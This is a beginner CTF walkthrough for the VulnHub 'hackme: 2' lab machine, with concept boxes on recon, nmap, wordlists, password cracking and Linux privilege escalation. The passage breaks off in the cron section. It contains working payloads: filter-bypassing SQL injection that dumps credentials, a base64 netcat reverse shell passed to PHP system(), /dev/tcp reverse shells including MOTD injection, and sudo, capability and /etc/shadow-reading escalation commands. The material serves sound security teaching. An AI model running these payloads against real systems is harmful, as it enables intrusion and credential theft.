# hackme: 2 — VulnHub Walkthrough (Beginner Friendly)

> **Authorized lab use only.** Run this machine inside an isolated virtual network
> (VirtualBox/VMware *host-only* adaptor). Never attack systems you do not own or
> have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | hackme: 2 |
| **Difficulty** | **3 — Easy** (stated: *Easy / Medium*) |
| **Author** | x4bx54 |
| **Released** | 6 Dec 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/hackme-2,618/> |
| **Download** | <https://download.vulnhub.com/hackme/hackme2-DHCP.ova> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) on VirtualBox, host-only network |
| **Target OS** | Linux |

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

hackme: 2 is the sequel to hackme: 1 and is a step harder — the author's own
description says *"more controls are in place to deter malicious attacks… you will
have to think out of the box."* The extra challenge is almost entirely in the
**filter bypasses**: the same classes of bug, but with defensive input filtering
that you must route around.

- Discovering a host and enumerating a PHP web application.
- Building a **SQL injection** payload that survives an input filter by using
  `/**/` comment-as-whitespace and `#` to comment out the rest of the query.
- Dumping the credential table and cracking a password **hash**.
- Recognising a **command-injection** feature in the admin panel.
- Defeating a **space-stripping** filter with `base64_decode()` to deliver a
  reverse shell.
- Privilege escalation via careful filesystem discovery.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Import the `.ova`, boot it, and keep Kali
on the same host-only network.

> **Note:** hackme: 2 does **not** ship `user.txt`/`root.txt` files — the goal is a
> `root` shell. Also note the VM is DHCP and occasionally the bundled MySQL daemon
> needs a restart; if the web app looks broken, reboot the target VM.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Confirm your own lab IP first
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# ARP-scan the subnet for live hosts
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:ab:cd:ef       PCS Systemtechnik GmbH
192.168.56.101  08:00:27:11:22:33       PCS Systemtechnik GmbH
```

```bash
# Alternative host discovery
sudo netdiscover -r 192.168.56.0/24
```

![arp scan showing the target host](images/01-recon.png)

**Target IP:** `192.168.56.101`

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.x ((Ubuntu))
|_http-title: hackme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** only two services, so the web app on port 80 is the whole
> story. SSH is our likely *destination* once we recover a credential.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
# Enumerate hidden files/directories on the web server
gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

```text
/login.php           (Status: 200)
/register.php        (Status: 200)
/welcome.php         (Status: 200)
/index.php           (Status: 200)
```

![nmap and directory enumeration](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Register, log in, and probe the search

Browse to `http://192.168.56.101/` — it is a login page. Register a throwaway
account at `register.php`, then log in. You land on `welcome.php`, which shows a
table of three columns: **Book ID**, **Title**, **Cost**.

> **Why it matters:** a three-column result table tells us the underlying
> `SELECT` returns **three columns** — useful information for the `UNION SELECT`
> we are about to build.

### 3.2 SQL injection + filter bypass

Test the search with a single quote `'`. Instead of a friendly error, the page
**silently shows nothing** — the app filters our input. This is the "control" the
author added.

Two tricks defeat it:

- Write `/**/` (an empty SQL comment) wherever a **space** would go. To SQL it is
  whitespace; to a naive filter it is not a space.
- Use `#` to **comment out** the remainder of the original query.

First, confirm injection and the column count:

```sql
'/**/union/**/select/**/NULL,NULL,NULL#
```

Then print controlled values:

```sql
'/**/union/**/select/**/database(),user(),version()#
```

```text
Book ID   Title            Cost
1         hackme2          root@localhost
```

> **Why it works:** `/**/` replaces the spaces in `UNION SELECT`, and `#` throws
> away everything the developer wrote after our injection point. The filter was
> looking for the literal string `union select` (and raw spaces) — it never saw
> them.

Enumerate the tables in the current database:

```sql
'/**/union/**/select/**/table_name,NULL,NULL/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()#
```

```text
Book ID   Title
1         books
1         users        <-- juicy: credentials
```

List the columns of `users`:

```sql
'/**/union/**/select/**/column_name,NULL,NULL/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'#
```

```text
Book ID   Title
1         id
1         user
1         pasword      <-- note the author's typo
```

Dump the credentials:

```sql
'/**/union/**/select/**/user,pasword,NULL/**/FROM/**/users#
```

```text
Book ID   Title                                   Cost
1         admin                                   <hash>
1         superadmin                              <hash>
```

![SQL injection dumping the users table](images/03-enum.png)

> **Why it works:** `information_schema` is a built-in MySQL catalogue that
> describes every table and column. Reading it lets us map the schema blind, then
> point our `UNION SELECT` at the real credential table. (Column/table names and
> hashes are exactly the kind of values you must read from your own instance.)

### 3.3 Crack the hash and log in as admin

Feed the admin hash to an online lookup ([CrackStation](https://crackstation.net/))
or a local tool:


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
hashcat -m 0 admin-hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 admin-hash.txt --show
```

```text
<hash>:<cracked-password>
```

> **Why it works:** the passwords are stored as weak (unsalted) hashes, so a
> wordlist recovers them. Log in at `login.php` as `admin` with the cracked
> password to reach the admin panel.

### 3.4 Command injection in the admin panel

The admin panel offers two features:

1. An **image upload** that only accepts `.jpeg`/`.jpg` — a deliberate dead end.
2. A **user search** that takes a *first name* and a *last name*.

Test the **last-name** field with a shell command:

```text
system("id")
```

```text
Enter the last name: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the backend passes the last-name value into a PHP `system()`
> call, so whatever shell command we type is executed on the server. The *first
> name* field is displayed but **not** executed; only *last name* reaches
> `system()`.

The catch: the filter **removes spaces**, so a normal reverse-shell one-liner
breaks. The escape is to send the **base64** of the command and let PHP decode it.

### 3.5 The reverse shell (base64 space-bypass)


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# 1) On Kali: start a listener
nc -lvnp 4444
```

```bash
# 2) Build a reverse-shell one-liner and base64-encode it (no wrap)
echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 4444 >/tmp/f' | base64 -w0
```

```text
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC41Ni4xMCA0NDQ0ID4vdG1wL2Y=
```

Paste this into the **last-name** field:

```text
system(base64_decode("cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC41Ni4xMCA0NDQ0ID4vdG1wL2Y="))
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 51*08
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the payload string itself contains **no spaces** (base64 uses
> `A–Z a–z 0–9 + / =`), so it sails past the space filter. On the server,
> `base64_decode()` turns it back into the real one-liner, and `system()` runs it.
> This is the "thinking outside the box" the author refers to.

Stabilise the shell:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then: stty raw -echo; fg   ; export TERM=xterm
```

![Reverse shell as www-data](images/04-foothold.png)
![Interactive shell](images/05-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

> **This is the discovery step.** The author deliberately hides the escalation
> path, and detailed public write-ups describe it as *"enumerating the filesystem,
> folder by folder, until you find the file that gives access to root."* Folklore
> in the walkthroughs points at `sudo`, but the exact artifact is image-specific —
> so **enumerate first, then abuse what you actually find.**

Run the standard sweep as `www-data`:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)
> ### 📖 Concept — File capabilities: the privesc everyone misses
>
> **Capabilities** are a finer-grained alternative to SUID. Instead of "all of root",
> a binary can be granted one *specific* privilege. `find -perm -u=s` **does not show
> them**, which is why this vector is missed so often.
>
> ```bash
> getcap -r / 2>/dev/null
> ```
>
> ```text
> /usr/bin/tar cap_dac_read_search=ep
> /usr/bin/python3.8 cap_setuid=ep
> ```
>
> | Capability | Grants |
> | --- | --- |
> | **`cap_setuid`** | Change your UID → set it to 0 → **instant root** |
> | `cap_setgid` | Change your GID |
> | **`cap_dac_read_search`** | **Read any file**, bypassing all permissions |
> | `cap_dac_override` | Write any file, bypassing permissions |
> | `cap_chown` | Change any file's owner |
> | `cap_sys_admin` | Broad — mounts, namespaces, many container escapes |
> | `cap_net_raw` | Craft raw packets (spoofing) |
>
> The `=ep` suffix means the capability is **e**ffective and **p**ermitted — i.e.
> active now.
>
> ```bash
> # cap_setuid → root in one line
> /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
>
> # cap_dac_read_search → read anything you like
> /usr/bin/tar -cf /tmp/s.tar --absolute-names /etc/shadow && tar -xOf /tmp/s.tar
> ```
>
> **Always run `getcap -r /` alongside the SUID hunt.** They are different mechanisms
> and finding one does not rule out the other.
>
> **Deep dive:** [CONCEPTS §15.4 — File capabilities](../../docs/CONCEPTS.md#154-file-capabilities)
> ### 📖 Concept — Finding files root executes that *you* can write
>
> This is the classic Linux privilege-escalation question: *is there anything that
> runs with elevated privileges whose contents I control?*
>
> ```bash
> find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" \
>      -not -path "/dev/*" -not -path "/run/*" 2>/dev/null
> find / -type f -perm -ug=rwx 2>/dev/null                    # rwx for user AND group
> find / -xdev -type f -perm -0002 -user root 2>/dev/null      # world-writable, root-owned
> ```
>
> `-perm -0002` tests the **other-write** bit. `-xdev` keeps the search on one
> filesystem so you do not wander into `/proc`.
>
> **High-value targets, in rough order of usefulness:**
>
> | Path | Why |
> | --- | --- |
> | **`/etc/passwd`** | Append a UID-0 account → `su` → root |
> | **`/etc/update-motd.d/*`** | Scripts run **as root on every SSH login** (MOTD injection) |
> | `/etc/sudoers`, `/etc/sudoers.d/*` | Add yourself a `NOPASSWD` rule |
> | `/etc/shadow` | Replace a hash with one you know |
> | `/etc/ld.so.preload` | A library loaded into **every** process, as root |
> | `/etc/crontab`, `/etc/cron.*` | Add a root job |
> | `/etc/exports` | Add `no_root_squash` to an NFS export |
> | root-owned scripts in `/opt`, `/srv`, `/usr/local` | Frequently world-writable by mistake |
> | any user's `~/.ssh/authorized_keys` | Passwordless SSH as them |
>
> **MOTD injection deserves special mention.** On Ubuntu/Debian, `pam_motd` runs every
> script in `/etc/update-motd.d/` during SSH login, historically **as root**. If any
> is writable by you, append a payload and log in again:
>
> ```bash
> echo 'bash -c "bash -i >& /dev/tcp/192.168.56.10/9090 0>&1"' >> /etc/update-motd.d/00-header
> exit ; ssh user@target      # → root reverse shell
> ```
>
> Use `>>` to **append** — `>` truncates the script and breaks the MOTD, which is how
> you end up wondering why nothing happened. Verify with `tail`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files](../../docs/CONCEPTS.md#156-writable-files-and-directories) ·
> [§15.11 — MOTD injection](../../docs/CONCEPTS.md#1511-motd-injection)
> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
